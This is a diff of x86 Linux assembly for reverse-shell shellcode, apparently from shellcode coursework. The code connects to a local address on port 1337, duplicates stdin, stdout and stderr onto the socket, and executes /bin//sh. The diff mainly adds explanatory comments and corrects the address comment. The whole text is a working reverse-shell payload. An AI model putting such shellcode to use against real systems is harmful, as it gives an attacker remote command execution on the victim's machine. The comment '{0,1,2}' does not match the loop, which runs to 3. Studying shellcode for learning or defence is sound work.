@@ -31,7 +31,7 @@ _start:
     ; connect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("127.0.0.1")}, 16)
     ;
     inc ebx             ; EBX = 0x2 
-    push 0x0101017f       ; sockaddr.sin_addr.s_addr: 127.0.0.1 (big endian)
+    push 0x0101017f       ; sockaddr.sin_addr.s_addr: 127.1.1.1 (big endian)
     push word 0x3905    ; sockaddr.sin_port       : PORT = 1337
     push bx             ; sockaddr.sin_family     : AF_INET = 2
     mov ecx, esp        ; ECX holds pointer to struct sockaddr
@@ -51,19 +51,19 @@ _start:
     ;
     xor ecx, ecx
 lbl:
-    mov al, 0x3f
+    mov al, 0x3f		; dup2()
     int 0x80
-    inc ecx
-    cmp cl, 0x4
-    jne lbl
+    inc ecx				; Iterate over {0,1,2}
+    cmp cl, 0x4			; Are we done?
+    jne lbl				; Nope
     
     ; execve("/bin//sh", NULL, NULL)
-    push edx
-    push 0x68732f2f
-    push 0x6e69622f
+    push edx			; Null terminator
+    push 0x68732f2f		; "hs//"
+    push 0x6e69622f		; "nib/"
     
-    mov ebx, esp
-    mov ecx, edx
+    mov ebx, esp		; EBX points to "/bin//sh"
+    mov ecx, edx		; ECX = NULL`
     
-    mov al, 0xb
+    mov al, 0xb			; execve()
     int 0x80
